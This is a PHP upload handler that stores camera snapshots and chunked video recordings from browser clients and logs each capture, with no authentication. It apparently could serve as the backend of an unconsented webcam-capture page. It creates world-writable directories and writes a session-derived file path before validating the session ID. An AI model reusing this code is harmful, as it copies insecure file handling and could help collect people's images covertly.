<?php

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/post_errors.log');

$uploadDir = __DIR__ . '/uploads/';
$finalDir = __DIR__ . '/final/';

if (!is_dir($uploadDir)) {
    if (!mkdir($uploadDir, 0777, true)) {
        error_log("Failed to create uploads directory: $uploadDir");
        http_response_code(500);
        die(json_encode(['status' => 'error', 'message' => 'Server configuration error - cannot create uploads dir']));
    }
    chmod($uploadDir, 0777);
}

if (!is_dir($finalDir)) {
    if (!mkdir($finalDir, 0777, true)) {
        error_log("Failed to create final directory: $finalDir");
        http_response_code(500);
        die(json_encode(['status' => 'error', 'message' => 'Server configuration error - cannot create final dir']));
    }
    chmod($finalDir, 0777);
}

/**
 * Sanitize input to prevent injection attacks
 */
function sanitize_input($data) {
    return htmlspecialchars(strip_tags(trim($data)), ENT_QUOTES, 'UTF-8');
}

/**
 * Sanitize filename
 */
function sanitize_filename($filename) {
    $filename = basename($filename);
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
    return $filename;
}

function validate_session_id($sessionId) {
    // Only allow alphanumeric and underscores, max 64 chars
    if (!preg_match('/^[a-zA-Z0-9_-]{1,64}$/', $sessionId)) {
        return false;
    }
    return true;
}

function verify_chunk_integrity($chunkData, $expectedSize = null) {
    if (empty($chunkData)) {
        return ['valid' => false, 'error' => 'Empty chunk data'];
    }
    
    $actualSize = strlen($chunkData);
    
    if ($expectedSize !== null && $actualSize !== $expectedSize) {
        return ['valid' => false, 'error' => "Size mismatch: expected $expectedSize, got $actualSize"];
    }
    
    return ['valid' => true, 'size' => $actualSize];
}

$timestamp = date('YmdHis');
$random_id = substr(md5(uniqid(mt_rand(), true)), 0, 8);

if (isset($_POST['cat']) || isset($_POST['image'])) {
    $imageData = $_POST['cat'] ?? $_POST['image'] ?? '';
    
    // Remove data URL prefix if present
    $imageData = preg_replace('/^data:image\/\w+;base64,/', '', $imageData);
    
    $decoded = base64_decode($imageData, true);
    if ($decoded === false || empty($decoded)) {
        error_log("Invalid image data received");
        http_response_code(400);
        die(json_encode(['status' => 'error', 'message' => 'Invalid image data']));
    }

    $filename = "cam_{$random_id}_{$timestamp}.jpg";
    $filepath = __DIR__ . '/../' . $filename;
    
    if (file_put_contents($filepath, $decoded) === false) {
        error_log("Failed to save camera image: $filepath");
        http_response_code(500);
        die(json_encode(['status' => 'error', 'message' => 'Failed to save image']));
    }

    $logMessage = "Camera snapshot: $filename | " . date('Y-m-d H:i:s') . PHP_EOL;
    file_put_contents(__DIR__ . '/../Log.log', $logMessage, FILE_APPEND | LOCK_EX);
    file_put_contents(__DIR__ . '/capture_log.txt', $logMessage, FILE_APPEND | LOCK_EX);

    http_response_code(200);
    echo json_encode(['status' => 'success', 'message' => 'Image received', 'filename' => $filename]);
    exit;
}

if (isset($_FILES['videoChunk']) || isset($_POST['chunk'])) {
    
    // Get chunk data from either binary upload or base64
    $chunkData = null;
    
    if (isset($_FILES['videoChunk']) && $_FILES['videoChunk']['error'] === UPLOAD_ERR_OK) {
        // Binary upload
        $chunkData = file_get_contents($_FILES['videoChunk']['tmp_name']);
        error_log("Received binary chunk upload: " . strlen($chunkData) . " bytes");
    } elseif (isset($_POST['chunk'])) {
        // Base64 encoded (fallback)
        $chunkData = base64_decode($_POST['chunk'], true);
        error_log("Received base64 chunk upload: " . strlen($chunkData) . " bytes");
    }
    
    if ($chunkData === false || empty($chunkData)) {
        error_log("Invalid chunk data received");
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid chunk data']);
        exit;
    }

    // Get metadata
    $chunkIndex = isset($_POST['chunkIndex']) ? filter_var($_POST['chunkIndex'], FILTER_VALIDATE_INT) : 0;
    $sessionId = isset($_POST['sessionId']) ? sanitize_input($_POST['sessionId']) : 'default';
    $filename = isset($_POST['filename']) ? sanitize_filename($_POST['filename']) : '';
    
    if ($chunkIndex === false || $chunkIndex < 0) {
        error_log("Invalid chunk index: $chunkIndex");
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid chunk index']);
        exit;
    }

    $chunkSize = strlen($chunkData);
    if ($chunkSize > 10 * 1024 * 1024) {
        error_log("Chunk too large: $chunkSize bytes");
        http_response_code(413);
        echo json_encode(['status' => 'error', 'message' => 'Chunk too large']);
        exit;
    }

    $extFile = $uploadDir . $sessionId . '.ext';
    if ($chunkIndex === 0 && !empty($filename)) {
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        if (empty($ext)) {
            $ext = 'webm';
        }
        $allowedExts = ['webm', 'mp4', 'mkv', 'avi', 'mov', 'ogv'];
        if (!in_array(strtolower($ext), $allowedExts)) {
            $ext = 'webm';
        }
        file_put_contents($extFile, strtolower($ext), LOCK_EX);
        error_log("Stored extension for session $sessionId: $ext in $extFile");
    }

    $chunkFile = $uploadDir . $sessionId . '.part' . $chunkIndex;
    
    if (!validate_session_id($sessionId)) {
        error_log("Invalid session ID format: $sessionId");
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid session ID format']);
        exit;
    }

    $integrity = verify_chunk_integrity($chunkData, $chunkSize);
    if (!$integrity['valid']) {
        error_log("Chunk integrity check failed: {$integrity['error']}");
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Chunk integrity check failed', 'details' => $integrity['error']]);
        exit;
    }

    if (file_exists($chunkFile)) {
        $existingSize = filesize($chunkFile);
        if ($existingSize === $chunkSize) {
            // Duplicate chunk with same size - skip
            error_log("Duplicate chunk detected: $chunkFile (skipping)");
            http_response_code(200);
            echo json_encode([
                'status' => 'success',
                'message' => 'Chunk already received (duplicate)',
                'chunk' => $chunkIndex,
                'size' => $chunkSize,
                'duplicate' => true
            ]);
            exit;
        } else {
            // Different size - overwrite with warning
            error_log("WARNING: Overwriting chunk $chunkFile (old: $existingSize bytes, new: $chunkSize bytes)");
        }
    }

    $bytesWritten = file_put_contents($chunkFile, $chunkData, LOCK_EX);
    
    if ($bytesWritten === false || $bytesWritten !== $chunkSize) {
        error_log("Failed to save chunk: $chunkFile (expected $chunkSize bytes, wrote $bytesWritten)");
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to save chunk']);
        exit;
    }

    $actualWritten = filesize($chunkFile);
    if ($actualWritten !== $chunkSize) {
        error_log("WARNING: File size mismatch after write: expected $chunkSize, actual $actualWritten");
    }

    $logMessage = "Chunk $chunkIndex received for $sessionId | Size: " . number_format($chunkSize) . " bytes | " . date('H:i:s') . PHP_EOL;
    file_put_contents(__DIR__ . '/Log_video.log', $logMessage, FILE_APPEND | LOCK_EX);
    
    error_log("Saved chunk $chunkIndex to $chunkFile ($bytesWritten bytes)");

    http_response_code(200);
    echo json_encode([
        'status' => 'success',
        'message' => 'Chunk received',
        'chunk' => $chunkIndex,
        'size' => $chunkSize,
        'file' => basename($chunkFile)
    ]);
    exit;
}

if (isset($_POST['type']) && $_POST['type'] === 'finalize' && isset($_POST['sessionId'])) {
    $sessionId = sanitize_input($_POST['sessionId']);
    
    if (!validate_session_id($sessionId)) {
        error_log("Invalid session ID format: $sessionId");
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid session ID format']);
        exit;
    }
    
    $chunkFiles = glob($uploadDir . $sessionId . '.part*');
    
    if (empty($chunkFiles)) {
        error_log("No chunks found for session: $sessionId in directory: $uploadDir");
        $allFiles = scandir($uploadDir);
        error_log("Directory contents: " . implode(', ', $allFiles));
        http_response_code(404);
        echo json_encode(['status' => 'error', 'message' => 'No chunks found', 'searched' => $uploadDir]);
        exit;
    }
    
    error_log("Found " . count($chunkFiles) . " chunks: " . implode(', ', array_map('basename', $chunkFiles)));
    
    usort($chunkFiles, function($a, $b) {
        $aNum = (int)preg_replace('/.*\.part(\d+)$/', '$1', $a);
        $bNum = (int)preg_replace('/.*\.part(\d+)$/', '$1', $b);
        return $aNum - $bNum;
    });
    
    $extFile = $uploadDir . $sessionId . '.ext';
    $ext = 'webm';
    if (file_exists($extFile)) {
        $ext = trim(file_get_contents($extFile));
        if (empty($ext)) {
            $ext = 'webm';
        }
        error_log("Using extension from metadata: $ext");
    } else {
        error_log("No extension metadata found, using default: $ext");
    }
    
    $timestamp = time();
    $finalFilename = "recording_{$sessionId}_{$timestamp}.{$ext}";
    $finalFile = $finalDir . $finalFilename;
    
    error_log("Creating final video file: $finalFile");
    
    $fp = fopen($finalFile, 'wb');
    if ($fp === false) {
        error_log("Failed to open final file: $finalFile (check permissions on $finalDir)");
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to create final video', 'path' => $finalDir]);
        exit;
    }
    
    $totalSize = 0;
    $mergedChunks = 0;
    
    foreach ($chunkFiles as $chunkPath) {
        $chunkContent = file_get_contents($chunkPath);
        if ($chunkContent === false) {
            error_log("Failed to read chunk: $chunkPath");
            continue;
        }
        
        $chunkSize = strlen($chunkContent);
        $bytesWritten = fwrite($fp, $chunkContent, $chunkSize);
        
        if ($bytesWritten === false || $bytesWritten !== $chunkSize) {
            error_log("Failed to write chunk to final file: expected $chunkSize, wrote $bytesWritten");
        } else {
            $totalSize += $bytesWritten;
            $mergedChunks++;
            error_log("Merged chunk " . basename($chunkPath) . " ($chunkSize bytes)");
        }
        
        unlink($chunkPath);
    }
    
    fclose($fp);
    
    if (file_exists($extFile)) {
        unlink($extFile);
    }
    
    chmod($finalFile, 0644);

    $chunkIndices = array_map(function($file) {
        preg_match('/\.part(\d+)$/', $file, $matches);
        return (int)($matches[1] ?? 0);
    }, $chunkFiles);
    
    sort($chunkIndices);
    $expectedCount = max($chunkIndices) + 1;
    $actualCount = count($chunkIndices);
    
    if ($actualCount !== $expectedCount) {
        $missing = array_diff(range(0, $expectedCount - 1), $chunkIndices);
        error_log("WARNING: Missing chunks detected for session $sessionId: " . implode(', ', $missing));
        // Continue anyway but log the warning
    }
    
    clearstatcache();
    $finalSize = filesize($finalFile);
    
    if ($finalSize === 0) {
        error_log("ERROR: Merged file is empty: $finalFile");
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Merged file is empty']);
        exit;
    }
    
    if ($finalSize !== $totalSize) {
        error_log("WARNING: Final file size mismatch: expected $totalSize, got $finalSize");
    }
    
    $sizeFormatted = number_format($finalSize / 1024 / 1024, 2);
    $finishMessage = "Video completed: $finalFilename | Size: {$sizeFormatted}MB | Chunks: $mergedChunks | " . date('Y-m-d H:i:s') . PHP_EOL;
    
    file_put_contents(__DIR__ . '/Log_finish.log', $finishMessage, FILE_APPEND | LOCK_EX);
    file_put_contents(__DIR__ . '/video_log.txt', $finishMessage, FILE_APPEND | LOCK_EX);
    
    error_log("Successfully merged $mergedChunks chunks into $finalFile ($sizeFormatted MB)");

    http_response_code(200);
    echo json_encode([
        'status' => 'success',
        'message' => 'Video merged successfully',
        'filename' => $finalFilename,
        'size' => $totalSize,
        'chunks' => $mergedChunks,
        'path' => 'saved_videos/final/' . $finalFilename
    ]);
    exit;
}

error_log("Invalid request - POST data: " . print_r($_POST, true) . " FILES: " . print_r($_FILES, true));
http_response_code(400);
echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
?>
